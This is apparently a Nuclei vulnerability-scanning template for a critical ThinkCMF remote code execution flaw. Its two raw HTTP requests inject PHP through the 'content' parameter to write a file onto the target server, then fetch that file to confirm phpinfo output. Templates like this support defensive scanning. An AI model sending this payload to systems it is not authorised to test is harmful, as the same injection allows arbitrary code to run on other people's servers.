id: thinkcmf-rce
info:
  name: ThinkCMF - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: ThinkCMF, a software program, is vulnerable to a security flaw that
    can allow hackers to execute code remotely.
  reference:
  - https://www.freebuf.com/vuls/217586.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: thinkcmf,rce
  metadata:
    impact: The impact of the ThinkCMF remote code execution vulnerability could allow
      a malicious actor to execute arbitrary code on someone's computer or server
      without their knowledge or consent.
    recommendation: It is highly recommended to patch ThinkCMF as soon as possible
      to mitigate the risk of remote code execution.
requests:
- raw:
  - 'GET /index.php?a=fetch&content={{url_encode(''<?php file_put_contents(\"{{randstr}}.php\",\"<?php
    echo phpinfo();\");'')}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - contains(body_2, "PHP Extension")
    - contains(body_2, "PHP Version")
    - status_code_2 == 200
    condition: and
